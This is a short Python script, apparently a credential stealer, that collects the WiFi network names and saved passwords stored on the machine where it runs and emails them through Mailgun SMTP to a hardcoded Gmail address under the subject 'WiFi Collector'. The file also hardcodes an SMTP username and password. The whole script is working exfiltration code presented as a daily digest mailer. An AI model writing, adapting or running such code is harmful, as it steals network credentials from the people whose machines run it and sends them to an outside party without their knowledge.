import get_WiFi_Passwords
import datetime
import smtplib
from email.message import EmailMessage

from_email = 'alhad@sandbox34eb5207bda14b318c12743c032a5c00.mailgun.org'
# Mailgun SMTP credentials
smtp_server = 'smtp.mailgun.org'
smtp_port = 587  # Use 465 for SSL
smtp_username = 'postmaster@sandbox34eb5207bda14b318c12743c032a5c00.mailgun.org'
smtp_password = 'AlhadMailgun1!'

class DailyDigestEmail:

    def __init__(self):
        self.content = get_WiFi_Passwords.getCredentials()

        self.recipients_list = ['alhad.manure@gmail.com']

        self.sender_credentials = {'email': smtp_username, # your sender email address
                                   'password': smtp_password} # your sender password

    def creatEmailText(self):
        emailText = f'Credentials \n'
        for wifi in self.content:
            emailText+= f'ssid: {wifi["ssid"]}, password: {wifi["password"]} \n'
        return emailText
    
    """
    Send digest email to all recipients on the recipient list.
    """
    def send_email(self):
        # build email message
        msg = EmailMessage()
        msg['Subject'] = f'WiFi Collector - {datetime.date.today().strftime("%d %b %Y")}'
        msg['From'] = from_email
        msg['To'] = ', '.join(self.recipients_list)

        # add Plaintext and HTML content
        msg.set_content(self.creatEmailText())
        #msg.add_alternative(msg_body['html'], subtype='html')

        # secure connection with STMP server and send email
        with smtplib.SMTP('smtp.mailgun.org', 587) as server:
            server.starttls()
            server.login(self.sender_credentials['email'], self.sender_credentials['password'])
            server.send_message(msg)
            server.quit()

if __name__ == '__main__':
    email = DailyDigestEmail()

    ##### test format_message() #####
    print('\nTesting email body generation...')

    ##### test send_email() #####
    print('\nSending test email...')
    email.send_email()